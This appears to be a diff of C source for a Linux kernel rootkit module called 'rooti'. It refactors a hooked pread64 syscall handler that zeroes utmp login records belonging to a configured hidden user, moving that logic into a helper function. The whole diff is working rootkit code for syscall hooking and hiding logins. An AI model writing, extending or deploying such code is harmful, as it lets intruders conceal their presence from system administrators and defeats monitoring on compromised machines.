@@ -11,9 +11,8 @@
 #include "client.h"
 #include "track.h"
 #include "rig.h"
-#include "mod_hiding.h"
+#include "hide.h"
 #include "hooking.h"
-#include "utmp.h"
 #include "config.h"
 
 MODULE_LICENSE("GPL");
@@ -174,9 +173,6 @@ static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
     int fd = regs->di;
     size_t count = regs->dx;
     char *user_buf = (char *)regs->si;
-    char *kernel_buf = NULL;
-    struct utmp *utmp_buf = NULL;
-    int err;
 
     // Invoke the original syscall
     size_t nread = rooti_orig_pread64(regs);
@@ -184,30 +180,7 @@ static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
-            kernel_buf = kmalloc(count, GFP_KERNEL);
-            if (kernel_buf == NULL) {
-                printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-                return nread;
-            }
-            err = copy_from_user(kernel_buf, user_buf, count);
-            if (err > 0) {
-                printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
-                kfree(kernel_buf);
-                return nread;
-            }
-
-            utmp_buf = (struct utmp *)kernel_buf;
-            if (strncmp(utmp_buf->ut_user, ROOTI_HIDE_USER, UT_NAMESIZE) == 0) {
-                // Match found, fill the buffer with zeros, marking it as invalid
-                memset(kernel_buf, 0, count);
-                err = copy_to_user(user_buf, kernel_buf, count);
-                if (err > 0) {
-                    printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
-                    kfree(kernel_buf);
-                    return nread;
-                }
-            }
-            kfree(kernel_buf);
+            rooti_filter_user_entry(user_buf, count, ROOTI_HIDE_USER);
         }
     }
     return nread;
